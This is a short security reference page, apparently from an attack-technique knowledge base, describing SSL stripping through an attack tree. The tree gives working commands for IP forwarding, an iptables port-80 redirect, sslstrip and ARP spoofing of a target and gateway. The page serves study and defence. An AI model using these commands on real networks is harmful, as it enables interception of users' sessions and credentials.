# SSL stripping

## Attack tree

```text
1 Strip SSL (AND)
    1.1 Install SSLStrip (AND)
    1.2 Configure attack machine for IP forwarding (echo 1 > /proc/sys/net/ipv4/ip_forward or sysctl -w net.ipv4.ip_forward=1) (AND)
    1.3 Route all HTTP traffic to SSLStrip (iptables –t nat –A PREROUTING -i eth0 –p tcp –dport 80 –j REDIRECT –to-port 54321) (AND)
    1.4 Run SSLStrip (sslstrip –l 54321)
2 Spoof ARP (AND)
    2.1 Install arpspoof (AND)
    2.2 Configure ARP spoofing (arpspoof –i eth0 –t <targetIP> <gatewayIP>)
3 Sniff traffic 
```

## Notes

SSL stripping downgrades an HTTPS connection to HTTP by intercepting the TLS authentication sent from the 
application to the user. The adversary sends an unencrypted version of the application’s site to the user while 
maintaining the secured session with the application. The user’s session is visible to the adversary.
It is one of the most potent [on-path attack](../box/mitm.md) between a client device and a server because it 
allows for exploitation of services that people assume to be secure.

## Tools

* [dsniff](https://www.monkey.org/~dugsong/dsniff/)
* [sslstrip](https://www.kali.org/tools/sslstrip/)
